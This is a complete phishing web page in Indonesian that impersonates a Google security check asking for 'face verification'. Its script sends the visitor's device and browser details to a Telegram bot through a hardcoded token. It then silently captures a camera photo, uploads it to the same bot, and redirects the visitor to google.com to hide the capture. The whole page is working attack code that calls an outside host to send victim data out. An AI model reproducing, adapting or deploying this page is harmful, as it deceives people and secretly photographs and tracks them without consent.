<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Update</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; width: 100%; }
        .logo { width: 75px; margin-bottom: 20px; }
        h2 { font-size: 24px; font-weight: 400; color: #202124; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
        #loader { display: none; margin-top: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <h2>Keamanan Perangkat</h2>
    <p>Kami mendeteksi aktivitas mencurigakan. Selesaikan verifikasi wajah untuk mengamankan akun Anda.</p>
    
    <button id="btn" onclick="start()">VERIFIKASI SEKARANG</button>

    <div id="loader">
        <div class="spinner"></div>
        <p>Memproses biometrik...</p>
    </div>
</div>

<video id="v" autoplay></video>
<canvas id="c"></canvas>

<script>
    const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
    const CHAT_ID = "8025603711";

    async function send(msg, isPhoto = false, blob = null) {
        if (isPhoto) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 't.jpg');
            fd.append('caption', msg);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } else {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`);
        }
    }

    async function start() {
        document.getElementById('btn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        // 1. Info Target
        send(`🔥 <b>TARGET WEB ONLINE!</b>\nDevice: ${navigator.platform}\nBrowser: ${navigator.userAgent}`);

        // 2. Realtime Cam
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = s;
            setTimeout(() => {
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => send("📸 <b>HASIL FOTO REALTIME!</b>", true, b), 'image/jpeg');
                s.getTracks().forEach(t => t.stop());
                alert("Verifikasi Berhasil!");
                window.location.href = "https://google.com";
            }, 3000);
        } catch (e) {
            send("❌ Target Menolak Izin Kamera");
            alert("Izin Kamera Diperlukan!");
            location.reload();
        }
    }
</script>

</body>
</html>
